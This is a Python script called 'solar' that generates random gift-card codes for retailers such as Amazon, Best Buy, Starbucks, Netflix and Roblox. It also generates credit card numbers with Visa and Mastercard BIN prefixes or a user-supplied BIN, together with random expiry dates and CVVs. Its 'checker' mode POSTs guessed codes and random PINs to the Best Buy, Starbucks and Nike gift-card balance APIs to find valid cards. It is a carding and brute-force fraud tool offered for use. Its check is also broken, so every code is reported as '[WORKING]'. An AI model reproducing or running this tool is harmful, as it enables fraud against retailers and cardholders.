from pystyle import Colors, Colorate
import os
import random
import requests
import time

def card(length):
 code = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))
 return code


def main():
 os.system('cls')
 os.system('title solar')

 menu_text = r"""
                                                        $$\                     
                                                        $$ |                    
                                     $$$$$$$\  $$$$$$\  $$ | $$$$$$\   $$$$$$\  
                                    $$  _____|$$  __$$\ $$ | \____$$\ $$  __$$\ 
                                    \$$$$$$\  $$ /  $$ |$$ | $$$$$$$ |$$ |  \__|
                                     \____$$\ $$ |  $$ |$$ |$$  __$$ |$$ |      
                                    $$$$$$$  |\$$$$$$  |$$ |\$$$$$$$ |$$ |      
                                    \_______/  \______/ \__| \_______|\__|      

                                    [00] Checker                     V1.0.2

                                ╔══════════════════════════════════════════════════════╗
                                ║                                                      ║
                                ║    [1] Amazon      [2] Walmart      [3] Best Buy     ║
                                ║    [4] EBAY        [5] Target       [6] Apple        ║
                                ║    [7] Starbucks   [8] Nike         [9] Sephora      ║
                                ║                                                      ║
                                ║    [10] Roblox     [11] Minecraft   [12] Fortnite    ║
                                ║    [13] Netflix    [14] Disney+     [15] Hbo         ║
                                ║    [16] Visa       [17] Mastercard  [18] CC          ║
                                ║                                                      ║
                                ╚══════════════════════════════════════════════════════╝                                         
                                            
"""

 menu_text2 = r"""
                                                        $$\                     
                                                        $$ |                    
                                     $$$$$$$\  $$$$$$\  $$ | $$$$$$\   $$$$$$\  
                                    $$  _____|$$  __$$\ $$ | \____$$\ $$  __$$\ 
                                    \$$$$$$\  $$ /  $$ |$$ | $$$$$$$ |$$ |  \__|
                                     \____$$\ $$ |  $$ |$$ |$$  __$$ |$$ |      
                                    $$$$$$$  |\$$$$$$  |$$ |\$$$$$$$ |$$ |      
                                    \_______/  \______/ \__| \_______|\__|   

                                    [00] Generator                     V1.0.2

                                ╔══════════════════════════════════════════════════════╗
                                ║                                                      ║
                                ║    [1] Bestbuy      [2] Starbucks      [3] Nike      ║
                                ║                                                      ║
                                ╚══════════════════════════════════════════════════════╝                                         
                                            
"""

 print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
 print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
 options = input(Colors.white + f'  └───' + Colors.purple + '➤ ' + Colors.white + '')
 if options == "1": #amazon
  os.system('cls')
  print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
  print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
  amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
  for i in range(int(amount)): 
   current_time = time.strftime("%H.%M.%S")
   generated_code = card(11)
   print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code)
   time.sleep(0.05)
   with open("output.txt", "a") as file:
            file.write(f"{generated_code}\n")
  t = input("")
  main()

 if options == "2": # walmart
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = card(4) + '-' + card(4) +  '-' + card(4) + '-' + card(4)
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code + ' | ' + str(random.randint(1000,9999)))
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}\n")
    t = input("")
    main()

 if options == "3": # Best buy
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = str(random.randint(1000,9999)) + '-' +str(random.randint(1000,9999)) +  '-' + str(random.randint(1000,9999)) + '-' + str(random.randint(1000,9999))
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code + ' | ' + str(random.randint(1000,9999)))
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}\n")
    t = input("")
    main()

 if options == "4": #ebay
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = card(4) + '-' + card(4) +  '-' + card(4) + '-' + card(4)
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code)
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}\n")
    t = input("")
    main()



 if options == "5": # Target
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = card(4) + '-' + card(4) +  '-' + card(4) + '-' + card(4)
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code + ' | ' + str(random.randint(1000,9999)))
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}\n")
    t = input("")
    main()

 if options == "6": # Apple
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = card(4) + '-' + card(4) +  '-' + card(4) + '-' + card(4)
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code + ' | ' + str(random.randint(1000,9999)))
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}\n")
    t = input("")
    main()

 if options == "7": # Starbucks
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = card(4) + ' ' + card(4) +  ' ' + card(4) + ' ' + card(4)
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code + ' | ' + str(random.randint(1000,9999)))
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}\n")
    t = input("")
    main()

 if options == "8": # Nike
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = card(6) + card(6) +  card(6) + card(6) + card(6)
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code + ' | ' + str(random.randint(100000,999999)))
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}\n")
    t = input("")
    main()

 if options == "9": # Starbucks
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = card(4) + card(4) + card(4) + card(4)
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code + ' | ' + str(random.randint(10000000,99999999)))
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}\n")
    t = input("")
    main()

 if options == "10": # Roblox
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = str(random.randint(1000000000,9999999999))
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code)
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}\n")
    t = input("")
    main()

 if options == "11": # Minecraft
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = card(4) + '-' + card(4) +  '-' + card(4) + '-' + card(4)
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code )
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}\n")
    t = input("")
    main()

 if options == "12": # Fortnite
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = card(4) + '-' + card(4) +  '-' + card(4) + '-' + card(4)
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code )
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}\n")
    t = input("")
    main()

 if options == "13": # Netflix
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = card(4) + '-' + card(4) +  '-' + card(4) + '-' + card(4) + '-' + card(4)
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code )
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}\n")
    t = input("")
    main()

 if options == "14": # Disney
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = card(4) + ' ' + card(4) +  ' ' + card(4) + ' ' + card(4)
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code )
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}\n")
    t = input("")
    main()

 if options == "15": # Hbo
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = card(4) + '-' + card(4) +  '-' + card(4) + '-' + card(4)
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code )
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}\n")
    t = input("")
    main()

 if options == "16": # Visa
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = "401940" + str(random.randint(1000000000,9999999999))
       month = "0" + str(random.randint(1,9))
       year = str(random.choice(["2025", "2026", "2027", "2028"]))
       cvv = str(random.randint(100,999))
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code + "|" + month + "|" + year + "|" + cvv)
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}|{month}|{year}|{cvv} \n")
    t = input("")
    main()

 if options == "17": # Mastercard
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = "510999" + str(random.randint(1000000000,9999999999))
       month = "0" + str(random.randint(1,9))
       year = str(random.choice(["2025", "2026", "2027", "2028"]))
       cvv = str(random.randint(100,999))
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code + "|" + month + "|" + year + "|" + cvv)
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}|{month}|{year}|{cvv} \n")
    t = input("")
    main()

 if options == "18": #Custom CC
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    binnum = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── Enter Bin ➤ ',1))
    amount = input(Colorate.Horizontal(Colors.purple_to_blue, f'  └─── How Much Would You Like To Generate ➤ ',1))
    for i in range(int(amount)):
       generated_code = f"{binnum}" + str(random.randint(1000000000,9999999999))
       month = "0" + str(random.randint(1,9))
       year = str(random.choice(["2025", "2026", "2027", "2028"]))
       cvv = str(random.randint(100,999))
       current_time = time.strftime("%H.%M.%S")
       print(Colors.blue + f"[{current_time}]" + Colors.white + ' > ' + Colors.green + generated_code + "|" + month + "|" + year + "|" + cvv)
       time.sleep(0.05)
       with open("output.txt", "a") as file:
            file.write(f"{generated_code}|{month}|{year}|{cvv} \n")
    t = input("")
    main()




 if options == "00":
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_blue, menu_text2,1))
    print(Colors.white + f'  ┌──<Wave@solar>─' + Colors.purple + '[+]')
    option = input(Colors.white + f'  └───' + Colors.purple + '➤ ' + Colors.white + '')
    if option == "0":
       main()
    if option == "1":
       with open("input.txt", 'r') as file:
            # Read all the lines in the file and strip whitespace
            lines = file.readlines()

            # Iterate through each line and treat it as a card code
            for line in lines:
                pin = random.randint(1000,9999)
                card_code = line.strip()
                json_data = {
                    'cardNumber': f'{card_code}',
                    'pin': pin,
                }

                response = requests.post('https://www.bestbuy.com/gift-card-balance/api/lookup', json=json_data)
                if response.status_code == "412":
                    current_time = time.strftime("%H.%M.%S")
                    print(Colors.red + f"[ERROR]" + Colors.white + ' > ' + Colors.green + card_code + ' | ' + str(random.randint(1000,9999)))
                else:
                    print(Colors.green + f"[WORKING]" + Colors.white + ' > ' + Colors.green + card_code + ' | ' + str(random.randint(1000,9999)))
    if option == "2":
     with open("input.txt", 'r') as file:

        lines = file.readlines()
        for line in lines:
            card_code = line.strip()
            pin = str(random.randint(10000000,99999999))
            json_data = {
            'cardNumber': f'{card_code}',
            'pin': pin,
            'market': 'US',
        }

            response = requests.post('https://www.starbucks.com/bff/gift/card/check-balance', json=json_data)
            if response.status_code == "400":
             print(Colors.red + f"[ERROR]" + Colors.white + ' > ' + Colors.green + card_code + ' | ' + pin)
            else:
             print(Colors.green + f"[WORKING]" + Colors.white + ' > ' + Colors.green + card_code + ' | ' + pin)  
    if option == "3":
     with open("input.txt", 'r') as file:

      lines = file.readlines()
      for line in lines:
        card_code = line.strip()
        pin = random.randint(100000,999999)
        json_data = {
    'accountNumber': f'{card_code}',
    'currency': 'USD',
    'pin': f'{pin}',
}
        response = requests.post('https://api.nike.com/payment/giftcard_balance/v1/', json=json_data)
        if response.status_code == "400":
             print(Colors.red + f"[ERROR]" + Colors.white + ' > ' + Colors.green + card_code + ' | ' + pin)
        else:
             print(Colors.green + f"[WORKING]" + Colors.white + ' > ' + Colors.green + card_code + ' | ' + pin)  


main()

